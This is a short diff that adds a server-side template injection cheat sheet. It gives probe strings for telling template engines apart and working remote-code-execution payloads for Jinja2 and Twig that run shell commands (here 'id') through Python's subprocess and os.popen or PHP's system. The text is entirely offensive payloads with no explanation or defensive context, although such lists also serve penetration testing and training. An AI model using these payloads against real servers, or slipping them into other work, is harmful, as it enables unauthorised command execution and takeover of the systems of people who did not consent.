@@ -1,0 +1,15 @@
+SSTI (Server-Side Template Injection)
+python# Probe
+{{7*7}}         # → 49 = Jinja2/Twig
+${7*7}          # → 49 = FreeMarker
+<%= 7*7 %>      # → 49 = ERB
+#{7*7}          # Thymeleaf
+
+# Jinja2 RCE
+{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Twig RCE
+{{['id']|filter('system')}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
